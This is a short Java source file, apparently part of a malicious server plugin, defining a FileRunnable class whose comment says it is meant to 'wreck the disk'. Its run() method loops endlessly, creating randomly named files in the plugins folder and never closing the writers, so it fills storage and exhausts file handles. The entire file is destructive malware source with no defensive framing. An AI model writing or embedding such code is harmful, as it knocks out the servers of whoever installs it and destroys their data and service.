package info.elaina.fucker.runnable;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.UUID;

public class FileRunnable implements Runnable {

    @Override
    public void run() {
        while (true) {
            // 写坏磁盘
            String random =  UUID.randomUUID().toString().replaceAll("-", "");
            File file = new File("./plugins/" + random);
            FileWriter writer = null;

            try {
                file.createNewFile();
                writer = new FileWriter(file, true);
                writer.append(random);
                writer.flush();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }
    }
}
